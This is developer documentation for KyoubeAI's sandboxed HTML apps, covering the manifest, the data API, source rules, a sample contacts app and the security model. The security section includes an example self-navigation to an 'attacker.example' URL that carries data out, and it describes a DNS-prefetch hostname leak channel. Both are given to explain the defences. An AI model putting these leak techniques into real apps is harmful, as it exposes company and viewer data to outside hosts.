# Building KyoubeAI apps

An app is **one HTML document** (inline CSS and JavaScript, no external URLs — an injected
Content-Security-Policy blocks all network access and remote scripts, though `data:`/`blob:` images
and `data:` fonts still work since they never leave the document) plus a **manifest** that declares
which Data tables it uses. Users open apps at `/<company>/app-artifact/<slug>`. Apps run in a sandboxed iframe
with an opaque origin (no cookies, no storage, no host DOM); the only way to reach data is `window.kyoube`.

## Workflow

1. Design or reuse tables with the `kyoube-data` skill (list tables, create tables).
2. Create the app (`POST /apps`, or the `apps_create` tool where a gateway exists — see "The API" below) with a
   manifest and the full source. This makes **draft version 1**.
3. Test in the browser? You cannot — ask the user to open the app; or reason carefully and keep the UI simple.
4. Publish (`POST /apps/{slug}/publish`; needs schema access — with write access only, ask an admin to publish
   from the app page).
5. Iterate with an update (`POST /apps/{slug}`, a new draft version) → publish. A rollback restores an earlier version.

An app is only an app when it is stored this way: a server on its own port or a page hosted elsewhere is not
reachable from the Apps page and has no access to the company's data. The Kyoube Apps skill says so to
agents in as many words.

The gallery shows the **published** version's `name`, `icon` and `description`. Renaming an app in a
draft manifest changes nothing anyone sees until that version is published — and a rollback takes the
older name back with the version it restores. Everyone with read access sees the gallery, including
people who cannot see drafts at all, which is why a draft never writes to it.

## Manifest

```json
{ "name": "Sales CRM", "slug": "sales-crm", "icon": "📇", "description": "Contacts and deals",
  "tables": [ { "name": "contacts", "access": "readwrite" }, { "name": "deals", "access": "readwrite" } ] }
```
`access` is `read` (default) or `readwrite`. A call on an undeclared table is rejected. The viewer's own
level still applies: a `viewer` can never write, whatever the app declares.

## window.kyoube (injected before your code runs)

```ts
await kyoube.ready()                       // → { companyId, viewer: { id, name, level }, app: { slug, name, version }, tables }
kyoube.data.query(table, { where?, orderBy?, limit?, offset?, fields? })   // → { rows, limit, offset }
kyoube.data.get(table, id)                 // → row | null
kyoube.data.count(table, where?)           // → { count }
kyoube.data.describe(table)                // → { fields: [{ name, kind, required, options }] }
kyoube.data.insert(table, rows)            // → created rows (validated by field kind)
kyoube.data.update(table, { ids } | { where }, patch)   // → { affected, rows }
kyoube.data.delete(table, { ids } | { where })          // → { affected }
kyoube.ui.toast(title, "info" | "success" | "warn" | "error")
kyoube.ui.openApp(slug)
```
`where` grammar: `{ field, op, value }` with `eq neq gt gte lt lte in contains starts_with is_null is_not_null`,
combined with `{ and: [...] }`, `{ or: [...] }`, `{ not: {...} }`. Errors are thrown as `kyoube.Error` with
`code` (`forbidden`, `invalid`, `not_found`, `conflict`, `limit`). Every row has `id`, `created_at`, `updated_at`.

`viewer.name` is always `""` in v1 — the host gives the worker ids, not display names — so greet the
viewer with `viewer.id` or with nothing at all, and never print `viewer.name` expecting a person's name.
`viewer.level` (`read`, `write`, `schema`) is the one worth branching on: hide the controls a viewer
cannot use.

## Rules for the source

- Start with `<!doctype html>`; put CSS in `<style>` and JS in `<script>` — no `src=`, `href=` to the network, no `fetch`.
- No `eval` and no `new Function`: the policy has no `'unsafe-eval'`, so both throw. Write real code, not
  code you build from strings (a templating helper that compiles a string is the usual way to trip on this).
- Use `kyoube.ready()` before the first data call; render loading and error states; keep lists paged (`limit` ≤ 200).
- Use semantic HTML and plain CSS; it must be readable on a 1024px-wide panel and in dark mode (`prefers-color-scheme`).
- **Never navigate the frame.** Assigning `location`, following a link to another document, or submitting
  a form stops the app: the runner treats a second page load as the app navigating away, kills the bridge,
  and replaces the frame with a notice. Use `kyoube.ui.openApp(slug)` to go to another app, keep links
  in-page (`href="#…"`), and `preventDefault()` every form submit (`form-action 'none'` blocks the
  submission itself, but the attempt is still a navigation).
- **Stay inside the call budget.** One frame may make **60 requests per rolling 10 seconds**, of
  which at most **5 may be toasts**. Every call counts — a data call, a `ui.openApp`, and a call the
  host rejects as invalid all cost the same one — and over the ceiling a call comes back with
  `code: "limit"` (`limit: too many requests`), while a toast over the smaller ceiling is silently
  dropped. Keep hitting either ceiling for three windows running and the app is stopped with a
  notice. Batch instead of looping: one `query` with a `limit` beats sixty `get`s, and `insert` takes
  an array of rows.
- No `<link rel="dns-prefetch">` or `<link rel="preconnect">`. They are the one network-shaped thing
  the policy does not govern (see the security model below), so treat them as forbidden rather than
  as a loophole; they cannot fetch anything for you in any case.
- Never store secrets or tokens in the app; never assume other companies' data exists.
- Keep the whole file under 2 MiB (usually well under 100 KB).

## Minimal example

```html
<!doctype html>
<html><head><meta charset="utf-8"><title>Contacts</title>
<style>body{font:14px system-ui;margin:16px}table{border-collapse:collapse;width:100%}td,th{border-bottom:1px solid #ddd;padding:6px;text-align:left}form{display:flex;gap:8px;margin:12px 0}@media(prefers-color-scheme:dark){body{background:#111;color:#eee}td,th{border-color:#333}}</style>
</head><body>
<h1>Contacts</h1>
<form id="f"><input name="name" placeholder="Name" required><input name="email" placeholder="Email"><button>Add</button></form>
<table><thead><tr><th>Name</th><th>Email</th><th></th></tr></thead><tbody id="rows"></tbody></table>
<script>
const rowsEl = document.getElementById("rows");
async function load() {
  const { rows } = await kyoube.data.query("contacts", { orderBy: [{ field: "created_at", direction: "desc" }], limit: 100 });
  rowsEl.innerHTML = rows.map(r => `<tr><td>${esc(r.name)}</td><td>${esc(r.email ?? "")}</td><td><button data-id="${r.id}">delete</button></td></tr>`).join("");
}
function esc(s) { return String(s).replace(/[&<>"]/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" }[c])); }
document.getElementById("f").addEventListener("submit", async (e) => {
  e.preventDefault();
  const data = Object.fromEntries(new FormData(e.target));
  try { await kyoube.data.insert("contacts", [data]); e.target.reset(); await load(); kyoube.ui.toast("Added", "success"); }
  catch (err) { kyoube.ui.toast(err.message, "error"); }
});
rowsEl.addEventListener("click", async (e) => {
  const id = e.target.dataset.id;
  if (id) { await kyoube.data.delete("contacts", { ids: [id] }); await load(); }
});
kyoube.ready().then(load);
</script>
</body></html>
```

## The API

Agents and scripts reach apps through the plugin's REST routes: base URL
`$PAPERCLIP_API_URL/api/plugins/kyoube.apps/api`, header `Authorization: Bearer $PAPERCLIP_API_KEY`, and the
company as `?companyId=…` on `GET` or `"companyId"` in every `POST` body. Every agent run already carries
`PAPERCLIP_API_URL`, `PAPERCLIP_API_KEY` and `PAPERCLIP_COMPANY_ID`; a board API key works too.

| Operation | Method and path | POST body fields (besides `companyId`) |
|---|---|---|
| List apps | `GET /apps` | — |
| Read an app | `GET /apps/{slug}?version=latest` (or `current`, or a number) | — |
| Create (draft v1) | `POST /apps` | `manifest`, `source`, `notes?` |
| Update (new draft) | `POST /apps/{slug}` | `manifest`, `source`, `notes?` |
| Publish | `POST /apps/{slug}/publish` | `version?` (default: latest draft) |
| Roll back | `POST /apps/{slug}/rollback` | `version` |
| Archive | `POST /apps/{slug}/archive` | — |

The same operations exist as `kyoube.apps:apps_*` tools, but the core (2026.831.1 through 2026.916.1) only hands plugin tools
to a run through an MCP gateway, which it creates only for agents that already have an MCP connection
(`architecture.md`, "Agent run → Kyoube"); the skill therefore leads with the API.

## Security model

Apps run in an iframe with `sandbox="allow-scripts allow-forms allow-modals"` — no `allow-same-origin`,
and deliberately no `allow-popups` (apps navigate between each other through `ui.openApp`, not a popup)
— so they have an opaque origin: no cookies, no core API, no storage, and no access to the host
document.

Network access is blocked by an injected `<meta http-equiv="Content-Security-Policy">` tag, **not** by
the sandbox attribute — the sandbox isolates the origin; the policy is what actually stops the app
reaching a server. The runner always prepends its own `<head>` (that tag, then the `window.kyoube`
SDK) at the very top of the document — after a leading `<!doctype html>`, ahead of everything else —
so nothing the app ships can be parsed before the policy. Your own `<head>` still works: the parser
re-parents its children into the head already open, and a `<html>` tag after it keeps its attributes.
The exact policy is:

```
default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; font-src data:; connect-src 'none'; form-action 'none'; base-uri 'none'
```

`default-src 'none'` and `connect-src 'none'` leave no way to `fetch`, open a `WebSocket`, or load any
remote resource — an app's only channel to the outside is the `postMessage` bridge described below. The
two `'unsafe-inline'` sources allow only the markup and script the app document itself ships (no remote
code can be loaded, and with no `'unsafe-eval'` in the policy, `eval` and `new Function` throw).
`img-src data: blob:` and `font-src data:` deliberately keep self-contained `data:`/`blob:` images and
`data:` fonts working, since they never leave the document. `form-action 'none'` and `base-uri 'none'`
close off form-submission and `<base>`-rewriting as navigation-shaped exfiltration channels — every
form submission is blocked, whatever its action, so a form handler must `preventDefault()` and do the
write through `kyoube.data.*` itself.

One thing the policy does **not** govern: `<link rel="dns-prefetch">` and `<link rel="preconnect">`.
Those ask the browser to resolve a hostname and open a socket rather than to fetch a resource, and no
CSP directive covers them (`prefetch-src` was removed from the spec and never shipped broadly). An app
that wanted to could therefore leak a small amount of information by encoding it into a hostname it
asks the browser to look up. It cannot read anything back — nothing is fetched, no response is
visible, and `connect-src 'none'` still blocks every actual request — so this is a low-bandwidth
one-way channel, not an exfiltration route for a table. Apps are told not to use either (see the
rules above), and the source of every version is stored and reviewable.

The only channel in or out of the frame is `postMessage` to the host page, which validates that the
message came from the exact iframe window it rendered, restricts accepted methods to the
`window.kyoube` surface (`data.*`, `ui.toast`, `ui.openApp`), and forwards data calls to the plugin
worker tagged with **the viewer's own identity** — never the app's. The worker re-authorises every call
against the viewer's access level and the app manifest's declared tables before touching the database:
a manifest can only narrow what the viewer could already do on the Data page, never widen it. `ui.toast`
shows a host toast; `ui.openApp(slug)` **navigates the host page** to another app (via the host's own
router) — it does not navigate the iframe, and the frame itself has no way to navigate the host (no
`allow-top-navigation`, no `allow-popups`).

A frame can still navigate *itself* — `location.href = "https://attacker.example/?…"` — and neither a
sandbox token nor a CSP directive stops that (the directives above govern fetch/XHR/WebSocket and
resource loads, not a script assigning `location`; blocking a *top* navigation of the host page is a
separate thing, which `allow-top-navigation`'s absence already does). Since a nested browsing context
keeps the same `WindowProxy` across such a navigation, the arriving document would otherwise inherit
the app's working bridge. So the runner counts loads and stops the app on the second one — the bridge
answers nothing further, the viewer's context is not re-announced, and the frame is replaced with
"This app navigated away and was stopped." That is why an app must never navigate its own frame; it
is not a restriction you can work around, only one you can trip over.

The load count is not an identification, though. The runner cannot tell *whose* document a `load`
belongs to, and the first one it sees is not necessarily the app's own: a document that assigns
`location` while it is still parsing never fires `load` at all, so the first load can already be the
arriving document's. That is why the bridge is not gated on the count. It is gated on a **handshake
nonce**. Every time the runner mounts an app it generates 16 random bytes and writes them into the
document immediately ahead of the SDK — inside the head it prepends, before any app-authored byte is
parsed. The SDK reads the value once, then removes both copies of it — it deletes the global *and*
removes the `<script>` element that carried it — so after the SDK installs, app code can reach the
nonce through neither `window` nor the DOM. It stamps the value on the handshake and on every request
it sends. The host acts only on messages carrying *that mount's* nonce; anything else is answered
with silence, and the third mismatch stops the app. Nor can app code read the nonce off the SDK's own
outgoing messages: the SDK binds `window.parent` at install, before any app byte is parsed, so
assigning over `window.parent` afterwards intercepts nothing. What an app in the frame holds
regardless is the context it asked for through its own `kyoube.ready()`, and the choice of URL it
navigates itself to — it needs no nonce for either.

The nonce is also what the viewer's context is released against. The host announces it **only** in
answer to a handshake carrying the mount's nonce — never on a frame load, which cannot say whose
document arrived — so a document that merely *arrives* by navigation, without the mount's nonce, is
told nothing about the company, the viewer or the app. (As above, an app that means to leak can send
the context it already holds to wherever it navigates; nothing on the host side stops an app
disclosing what it was given, and the destination learns nothing *further* from the frame.) The
SDK repeats its handshake every 250 ms (about twenty times) until the answer comes, so
`kyoube.ready()` still resolves as soon as the host is listening.

Each mount also has a **call budget**: 60 requests per rolling 10 seconds, of which at most 5 may be
toasts. Every request but the handshake counts, including one the host goes on to refuse as invalid
— over the ceiling a call comes back as `kyoube.Error` with `code: "limit"`, an over-quota toast is
dropped, and three consecutive limited windows stop the app with a notice. (A message that is not a
well-formed request for one of the SDK's methods, or that carries the wrong nonce, is dropped before
any of this: nothing is charged for it because nothing is done about it.) It is generous for anything a person drives
and small for a loop, which is the distinction it is drawn on.

`data_sql_select`'s read-only SQL validator also allowlists *functions*: a statement may call only
the documented set of pure scalar, aggregate and window builtins (`count`, `lower`, `date_trunc`,
`jsonb_build_object`, `row_number`, …). Every other name is rejected — no `pg_*` function is on the
list at all — as is a cast to any `reg*` OID alias type (`'pg_class'::regclass`), so neither the
catalog nor the filesystem nor a server setting is reachable from an app's queries.

An app can therefore never do more than the person using it could do on the Data page.
